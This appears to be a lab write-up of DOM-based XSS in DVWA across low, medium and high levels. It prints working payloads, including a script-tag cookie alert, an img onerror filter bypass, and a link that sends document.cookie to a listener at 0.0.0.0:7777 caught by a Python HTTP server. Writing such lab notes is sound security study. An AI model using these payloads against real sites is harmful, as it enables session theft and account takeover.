# XSS (Cross-Site Scripting)

XSS is a web vulnerability where an attacker injects malicious JavaScript into a website, which then runs in another user's browser, in order to steal cookies/sessions, impersonate the victim, etc.

## DOM-Based XSS

DOM XSS happens when JavaScript in the browser takes untrusted input and writes it into the page without sanitization, and it takes place on the client side, nothing goes to the server.

The attacker does NOT hack the victim's browser directly. They trick the victim into loading a page or input that already contains the malicious JavaScript.

### (Said by DVWA Creator)

DOM Based XSS is a special case of reflected XSS where the JavaScript is hidden in the URL and pulled out by JavaScript in the page while it is rendering rather than being embedded in the page when it is served. This can make it stealthier than other attacks, and WAFs or other protections which are reading the page body do not see any malicious content.

## Objective

I should run my own JavaScript in another user's browser, use this to steal the cookie of a logged in user.

## LOW

Starting with testing the feature the app provides, which is changing language by selecting a language from a list. By inspecting the source code:

<img width="1579" height="727" alt="Screenshot from 2026-02-07 16-41-04" src="https://github.com/user-attachments/assets/9c8af678-9a89-4ee3-9fe4-e6f2b4ca39fa" />


It appears that this functionality is handled through a parameter called `default`. This parameter reflects user input into an executable context without proper sanitization. So I tried replacing the language value with `<script>alert(document.cookie)</script>`, and it successfully displayed my cookies.

<img width="1272" height="282" alt="Screenshot from 2026-02-07 16-42-49" src="https://github.com/user-attachments/assets/bb4808c4-aa7d-463c-9f88-3206443db1ce" />


Now let's steal that cookie. Imagine I social engineered someone and tricked them into clicking my well-crafted link, which exploits the DOM XSS vulnerability in the default parameter.

So I send them something like:
```
http://nonexist.com/?default=<script>window.location='http://0.0.0.0:7777/?cookie=' + document.cookie</script>
```

While I set up my listener, an HTTP server to catch the incoming cookie, something like:
```bash
python3 -m http.server 7777
```

<img width="1920" height="226" alt="Screenshot from 2026-02-07 16-51-18" src="https://github.com/user-attachments/assets/4a85427d-3add-4789-a0f7-20fea4dec6b6" />


You can see I'm using `0.0.0.0` and a local HTTP server because this is just DVWA, but in reality we would need a real HTTP server and a public IP.

But this works only if the cookies aren't set to `HttpOnly`, because `HttpOnly` prevents JavaScript from reading cookies.

## MEDIUM

So the dev team tried to fix this issue by blacklisting any references to `<script`, so we have to find another way to steal cookies without using the script tag.

<img width="1193" height="153" alt="Screenshot from 2026-02-07 17-04-47" src="https://github.com/user-attachments/assets/8701690e-7c21-4f93-94e3-6a0953621019" />


By checking the OWASP cheat sheet about XSS filter evasion, I found some interesting techniques to bypass that `<script` filter:

https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

So by trying: `<img src/onerror = alert(document.cookie)>`:

<img width="1521" height="876" alt="Screenshot from 2026-02-07 17-11-02" src="https://github.com/user-attachments/assets/4844e8c5-d016-4eb6-87b4-3207ce471586" />


## HIGH

Now instead of blacklisting, the dev team decided to whitelist only the allowed languages, so now we have to find a way to bypass this too.

So by searching, I found a technique called **Fragment Identifier Injection**. It abuses the URL fragment — everything after `#`. Basically, everything after `#` won't be sent to the server.

So let's try it on DVWA.

<img width="1575" height="317" alt="Screenshot from 2026-02-07 17-32-24" src="https://github.com/user-attachments/assets/7f83a8e5-788b-4304-89eb-d703e038dcfd" />


For capturing the cookie, we can use the same method as in the LOW level.
